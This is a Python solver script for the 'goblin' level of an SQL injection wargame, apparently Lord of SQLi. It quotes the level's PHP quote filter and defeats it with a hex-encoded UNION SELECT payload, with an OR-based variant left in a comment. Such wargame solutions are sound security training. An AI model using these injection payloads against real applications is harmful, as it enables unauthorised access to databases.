#!/usr/bin/env python3
import los
import los_cookies as lc
from connect import my_request as req


def main():
    '''
    Goblin

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
    $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("goblin");
    '''

    url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
    cook = lc.check_cookies(url)

    # (no='0 or id=0x61646D696E')
    param = dict(no='0 union select 0x61646D696E')

    response = req.get_request(url, param, cook)

    if 'Clear!' in response:
        print('GOBLIN Clear!')


if __name__ == '__main__':
    main()
